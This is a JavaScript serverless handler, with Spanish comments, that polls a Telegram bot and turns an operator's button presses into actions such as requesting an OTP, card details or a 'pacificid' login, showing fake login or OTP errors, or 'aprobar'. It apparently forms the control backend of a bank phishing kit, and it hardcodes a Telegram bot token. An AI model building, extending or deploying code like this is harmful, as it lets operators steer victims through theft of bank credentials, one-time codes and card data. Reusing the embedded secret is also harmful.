const TOKEN = process.env.TELEGRAM_TOKEN || "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();

  try {
    // Siempre traer los updates sin offset — Telegram solo manda los no leídos
    const r = await fetch(
      `https://api.telegram.org/bot${TOKEN}/getUpdates?timeout=0&allowed_updates=["callback_query"]`
    );
    const data = await r.json();

    if (!data.ok || !data.result.length) {
      return res.status(200).json({ ok: true, action: null });
    }

    // Tomar el update más reciente
    const update = data.result[data.result.length - 1];
    const uid = update.update_id;
    const cb = update.callback_query;

    if (!cb) {
      // Marcar como leído y salir
      await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${uid + 1}&timeout=0`);
      return res.status(200).json({ ok: true, action: null });
    }

    const cbData = cb.data;

    // Confirmar al bot
    await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: cb.id, text: "✅ Enviado al cliente" }),
    });

    // MARCAR COMO LEÍDO INMEDIATAMENTE
    await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${uid + 1}&timeout=0`);

    if (cbData === "otp")             return res.status(200).json({ ok: true, action: "otp" });
    if (cbData === "tarjeta")         return res.status(200).json({ ok: true, action: "tarjeta" });
    if (cbData === "pacificid")       return res.status(200).json({ ok: true, action: "pacificid" });
    if (cbData === "error_login")     return res.status(200).json({ ok: true, action: "error_login" });
    if (cbData === "error_otp")       return res.status(200).json({ ok: true, action: "error_otp" });
    if (cbData === "error_pacificid") return res.status(200).json({ ok: true, action: "error_pacificid" });
    if (cbData === "error_tarjeta")   return res.status(200).json({ ok: true, action: "error_tarjeta" });
    if (cbData === "aprobar")         return res.status(200).json({ ok: true, action: "aprobar" });

    return res.status(200).json({ ok: true, action: null });

  } catch (err) {
    return res.status(500).json({ ok: false, action: null, error: err.message });
  }
}
